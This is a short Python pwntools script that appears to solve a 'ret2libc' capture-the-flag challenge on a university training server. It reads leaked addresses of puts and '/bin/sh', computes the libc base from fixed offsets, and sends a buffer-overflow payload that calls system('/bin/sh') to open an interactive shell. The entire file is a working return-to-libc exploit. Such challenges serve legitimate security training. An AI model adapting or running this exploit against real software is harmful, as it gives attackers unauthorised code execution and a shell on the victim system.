from pwn import *

local = False
elf = 'ret2libc' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "bamboofox.cs.nctu.edu.tw"
    port = 11002
    r = remote(ip,port)

context.arch = 'i386'

r.recvuntil("The address of \"/bin/sh\" is ")
sh = int(r.recvline(),16)

r.recvuntil("The address of function \"puts\" is ")
put_addr = int(r.recvline(),16)

put_offset = 0x00064da0
base = put_addr - put_offset
system_addr =  base + 0x0003fe70

payload = "a" * 32 + p32(system_addr) + 'ssss' + p32(sh)
r.sendline(payload)
r.interactive()